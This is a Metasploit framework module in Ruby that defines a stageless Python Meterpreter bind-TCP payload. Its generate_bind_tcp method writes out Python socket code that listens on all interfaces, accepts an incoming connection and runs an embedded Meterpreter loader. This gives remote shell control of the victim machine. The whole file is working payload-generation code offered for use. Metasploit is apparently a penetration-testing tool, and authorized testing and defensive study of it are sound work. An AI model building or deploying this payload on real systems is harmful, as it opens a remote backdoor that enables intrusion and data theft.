##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/python'
require 'msf/core/payload/python/meterpreter_loader'
require 'msf/core/payload/python/bind_tcp'
require 'msf/base/sessions/meterpreter_python'

module MetasploitModule

  CachedSize = 71962

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Payload::Python::BindTcp
  include Msf::Payload::Python::MeterpreterLoader

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Python Meterpreter Shell, Bind TCP Inline',
      'Description' => 'Connect to the victim and spawn a Meterpreter shell',
      'Author'      => 'Spencer McIntyre',
      'License'     => MSF_LICENSE,
      'Platform'    => 'python',
      'Arch'        => ARCH_PYTHON,
      'Handler'     => Msf::Handler::BindTcp,
      'Session'     => Msf::Sessions::Meterpreter_Python_Python
    ))
  end

  def generate_bind_tcp(opts={})
    socket_setup  = "bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
    socket_setup << "bind_sock.bind(('0.0.0.0', #{opts[:port]}))\n"
    socket_setup << "bind_sock.listen(1)\n"
    socket_setup << "s, address = bind_sock.accept()\n"
    opts[:stageless_tcp_socket_setup] = socket_setup
    opts[:stageless] = true

    met = stage_meterpreter(opts)
    py_create_exec_stub(met)
  end
end
